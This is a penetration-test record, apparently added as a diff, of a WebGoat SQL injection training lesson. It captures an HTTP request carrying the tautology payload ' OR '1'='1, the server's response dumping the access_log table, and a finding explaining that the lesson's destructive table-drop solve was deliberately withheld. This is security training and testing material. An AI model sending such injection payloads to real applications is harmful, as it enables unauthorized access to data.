@@ -1,0 +1,44 @@
+Lesson: SQL Injection (intro) / assignment SqlInjectionLesson10 ("Compromising Availability")
+Captured via Chrome DevTools Network panel (live browser interaction), Run #9, 2026-11-16T11:17:49Z
+
+### Request (NON-DESTRUCTIVE read-only proof only - see note below)
+POST http://10.242.10.31:8007/WebGoat/SqlInjection/attack10 HTTP/1.1
+Referer: http://10.242.10.31:8007/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 27
+Cookie: JSESSIONID=EB5681DBBE34AF0FD5E2A4E855CBA117
+Origin: http://10.242.10.31:8007
+Host: 10.242.10.31:8007
+
+action_string='+OR+'1'%3D'1
+
+(decoded: action_string=' OR '1'='1)
+
+### Response
+HTTP/1.1 200
+Content-Type: application/json
+Content-Length: 722
+
+{
+  "assignment" : "SqlInjectionLesson10",
+  "attemptWasMade" : true,
+  "feedback" : "There is still evidence of what you did. Better remove the whole table.",
+  "lessonCompleted" : false,
+  "output" : "<table>... full access_log rows including the raw SQL text of this run's own earlier SqlInjectionLesson8/9
+  requests ...</table>"
+}
+
+### Analysis (finding F-SQLI-05) - GUARDRAIL-COMPLIANT PARTIAL TEST, NOT MARKED SOLVED
+This lesson's own INTENDED "solve" explicitly requires dropping/deleting the entire access_log table
+("Better go and delete it completely"). Per Section 3h control #6, destructive payloads (DROP/DELETE/
+TRUNCATE/destructive UPDATE) must never be sent, with no exception for completing a lesson's intended
+exercise. Instead, a read-only boolean-tautology payload (`' OR '1'='1`) was sent to the same input field
+to confirm the injection point exists without executing the destructive action. The server returned ALL
+access_log rows (bypassing whatever filter the "Action contains" search box was meant to apply), confirming
+the field IS injectable and that a real attacker could reach this DROP/DELETE primitive - but this run
+deliberately stopped short of actually dropping the table.
+lessonCompleted: false (intentionally not completed, by guardrail policy, not due to a failed attempt).
+Severity: MEDIUM per Section 3j rubric - "a real but limited-impact bypass" (confirmed injection point/
+filter bypass) without this run causing or confirming the full availability-destruction impact, which was
+deliberately not executed per Section 6/3h guardrails.
